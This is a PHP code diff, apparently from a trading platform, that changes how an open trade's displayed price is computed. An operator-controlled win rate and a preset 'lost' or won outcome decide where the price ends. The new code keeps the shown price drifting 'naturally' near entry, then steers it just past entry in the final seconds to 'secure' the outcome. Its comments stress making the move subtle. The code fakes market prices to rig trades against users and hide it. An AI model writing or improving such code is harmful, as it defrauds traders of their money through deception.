@@ -277,16 +277,15 @@ function get_active_trade_controlled_price(array $asset, int $timestampMs, ?int 
         $basePrice = market_reference_price($asset);
     }
 
-    $baseMargin = max($tick * 3.0, $basePrice * 0.0004);
-
+    // Tight, subtle margin: just enough past entry price so user loses/wins cleanly without huge vertical moves
+    $tightMargin = max($tick * 2.0, $basePrice * 0.00015);
     $winRate = 50.0;
     if ($control !== null && isset($control['win_rate']) && $control['win_rate'] !== null) {
         $winRate = max(0.0, min(100.0, (float)$control['win_rate']));
     }
 
     $intensity = abs($winRate - 50.0) / 50.0;
-    $marginMultiplier = 1.0 + ($intensity * 1.5);
-    $targetMargin = $baseMargin * $marginMultiplier;
+    $targetMargin = $tightMargin * (1.0 + ($intensity * 0.5));
 
     if ($trade['direction'] === 'up') {
         $targetPrice = ($outcome === 'lost') ? ($entryPrice - $targetMargin) : ($entryPrice + $targetMargin);
@@ -295,16 +294,34 @@ function get_active_trade_controlled_price(array $asset, int $timestampMs, ?int 
     }
 
     if (!$isDecaying) {
-        // Active trade: 100% controlled motion anchored to entryPrice and targetPrice
-        // ZERO external API interference can affect this curve!
+        // Steering Curve Strategy:
+        // Keep price floating close to entry price with subtle natural oscillations for the first ~75% of the trade duration.
+        // In the final 25% (or last 8 seconds), steer smoothly and decisively just past entry price so the outcome is secured.
         $elapsedMs = max(0, $timestampMs - $openedAtMs);
+        $remainingMs = max(0, $expiresAtMs - $timestampMs);
         $rawProgress = min(1.0, max(0.0, $elapsedMs / (float)$durationMs));
-        $biasProgress = $rawProgress * $rawProgress * (3.0 - 2.0 * $rawProgress);
 
-        $timeSec = $timestampMs / 1000.0;
-        $microFluctuation = sin($timeSec * 2.5) * ($targetMargin * 0.08 * $biasProgress);
+        // Define steering window: final 8000ms or last 25% of trade, whichever is shorter
+        $steerWindowMs = min((float)$durationMs * 0.35, 8000.0);
+        $sec = $timestampMs / 1000.0;
 
-        $price = $entryPrice + (($targetPrice - $entryPrice) * $biasProgress) + $microFluctuation;
+        if ($remainingMs > $steerWindowMs) {
+            // Early/Mid trade: natural organic oscillation around entry price (+/- 2 ticks)
+            $earlyWave = sin($sec * 1.8) * ($tightMargin * 0.40);
+            $price = $entryPrice + $earlyWave;
+        } else {
+            // Final phase: smooth progress from current position to targetPrice
+            $steerElapsed = $steerWindowMs - $remainingMs;
+            $steerProgress = min(1.0, max(0.0, $steerElapsed / $steerWindowMs));
+            $smoothFactor = $steerProgress * $steerProgress * (3.0 - 2.0 * $steerProgress);
+
+            $earlyWaveAtSteerStart = sin(($expiresAtMs - $steerWindowMs) / 1000.0 * 1.8) * ($tightMargin * 0.40);
+            $startPrice = $entryPrice + $earlyWaveAtSteerStart;
+            $microFluctuation = sin($sec * 2.5) * ($tightMargin * 0.05 * (1.0 - $smoothFactor));
+
+            $price = $startPrice + (($targetPrice - $startPrice) * $smoothFactor) + $microFluctuation;
+        }
+
         return round($price, $decimals);
     } else {
         // Post-expiry decay window (0..4s): interpolate from targetPrice back to real market price
